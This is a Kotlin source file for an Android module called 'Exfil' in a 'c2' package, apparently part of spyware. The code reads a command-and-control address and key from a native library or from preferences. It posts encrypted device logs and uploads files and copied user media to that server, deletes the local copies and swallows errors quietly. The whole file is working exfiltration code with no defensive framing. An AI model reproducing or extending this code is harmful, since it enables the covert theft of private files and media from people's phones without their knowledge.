package com.sp.core.c2

import android.content.Context
import android.net.Uri
import com.sp.core.util.Crypto
import com.sp.core.util.Prefs
import com.sp.loader.NativeKey
import okhttp3.*
import java.io.File
import java.util.concurrent.TimeUnit

object Exfil {
    private val client = OkHttpClient.Builder()
        .connectTimeout(20, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .retryOnConnectionFailure(true)
        .build()

    private var c2Url: String? = null
    private var apiKey: String? = null

    private fun resolveConfig(ctx: Context) {
        if (c2Url == null) {
            val nativeUrl = NativeKey.c2Url()
            c2Url = nativeUrl.takeIf { it.isNotEmpty() }
                ?: (Prefs.get(ctx, "c2_url", "") as? String)
        }
        if (apiKey == null) {
            val nativeKey = NativeKey.apiKey()
            apiKey = nativeKey.takeIf { it.isNotEmpty() }
                ?: (Prefs.get(ctx, "api_key", "") as? String)
        }
    }

    fun sendLog(ctx: Context, kind: String, payload: String) {
        resolveConfig(ctx)
        if (c2Url.isNullOrEmpty()) return
        val deviceId = Prefs.deviceId(ctx)
        val encrypted = Crypto.encrypt("$deviceId|$kind|$payload")
        val body = FormBody.Builder()
            .add("d", encrypted).add("k", apiKey ?: "").build()
        val req = Request.Builder().url("${c2Url}/ingest").post(body).build()
        client.newCall(req).enqueue(object : Callback {
            override fun onFailure(call: Call, e: java.io.IOException) {}
            override fun onResponse(call: Call, response: Response) { response.close() }
        })
    }

    fun uploadFile(ctx: Context, file: File, kind: String) {
        resolveConfig(ctx)
        if (c2Url.isNullOrEmpty()) return

        val deviceId = Prefs.deviceId(ctx)
        val body = MultipartBody.Builder().setType(MultipartBody.FORM)
            .addFormDataPart("meta", "$deviceId|$kind|${file.name}")
            .addFormDataPart("f", file.name,
                RequestBody.create(file, MediaType.parse("application/octet-stream")))
            .build()
        val req = Request.Builder().url("${c2Url}/upload")
            .header("X-Key", apiKey ?: "").post(body).build()
        client.newCall(req).enqueue(object : Callback {
            override fun onFailure(call: Call, e: java.io.IOException) {}
            override fun onResponse(call: Call, response: Response) {
                response.close(); file.delete()
            }
        })
    }

    fun uploadMedia(ctx: Context, uri: Uri, kind: String, name: String, size: Long) {
        try {
            val tmp = File(ctx.cacheDir, "m_${System.currentTimeMillis()}_$name")
            ctx.contentResolver.openInputStream(uri)?.use { ins ->
                tmp.outputStream().use { outs -> ins.copyTo(outs) }
            }
            uploadFile(ctx, tmp, kind)
        } catch (_: Exception) {}
    }
}
